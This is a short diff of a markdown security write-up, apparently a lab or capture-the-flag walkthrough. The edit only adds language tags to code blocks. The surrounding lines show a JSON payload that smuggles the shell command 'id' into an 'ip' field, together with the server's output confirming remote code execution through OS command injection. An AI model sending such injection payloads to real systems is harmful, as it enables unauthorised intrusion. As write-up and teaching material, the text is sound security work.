@@ -267,13 +267,13 @@ It's time to replay this request in Burp Suite to see what I can get from it. Af
 
 If I send this payload :
 
-```
+```json
 {"ip":"0.0.0.0.;id"}
 ```
 
 Server replies with :
 
-```
+```r
 "0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
 ```
 Confirming RCE through os command injection
